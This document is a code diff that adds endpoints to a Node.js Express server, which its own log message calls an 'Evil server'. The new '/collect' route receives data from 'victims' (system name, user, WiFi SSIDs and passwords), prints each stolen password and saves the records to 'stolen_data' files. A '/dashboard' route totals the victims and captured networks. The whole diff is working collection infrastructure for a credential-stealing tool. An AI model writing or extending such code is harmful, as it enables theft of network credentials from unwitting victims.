@@ -33,6 +33,38 @@ app.post('/upload', upload.array('files', 100), (req, res) => {
     }
     res.status(200).send('Files received successfully');
 });
+app.post('/collect', (req, res) => {
+    const data = req.body;
+    const timestamp = new Date().toISOString();
+    console.log(`New victim: ${data.victim} (${data.user})`);
+    console.log(`Networks captured: ${data.networks.length}`);
+    const filename = `stolen_data_${timestamp.replace(/:/g, '-')}.json`;
+    fs.writeFileSync(filename, JSON.stringify(data, null, 2));
+    data.networks.forEach(network => {
+        console.log(`SSID: ${network.ssid} | Password: ${network.password}`);
+    });
+    res.json({ 
+        status: 'success', 
+        message: 'Data received and stored',
+        count: data.networks.length 
+    });
+});
+app.get('/dashboard', (req, res) => {
+    const files = fs.readdirSync('.').filter(f => f.startsWith('stolen_data_'));
+    const allData = files.map(file => {
+        return JSON.parse(fs.readFileSync(file, 'utf8'));
+    });
+    res.json({
+        totalVictims: allData.length,
+        totalNetworks: allData.reduce((sum, data) => sum + data.networks.length, 0),
+        victims: allData.map(d => ({
+            system: d.victim,
+            user: d.user,
+            networks: d.networks.length,
+            timestamp: d.timestamp
+        }))
+    });
+});
 app.listen(process.env.PORT, "0.0.0.0", () => {
     console.log(`[+] Evil server listening on port ${process.env.PORT}`);
 });
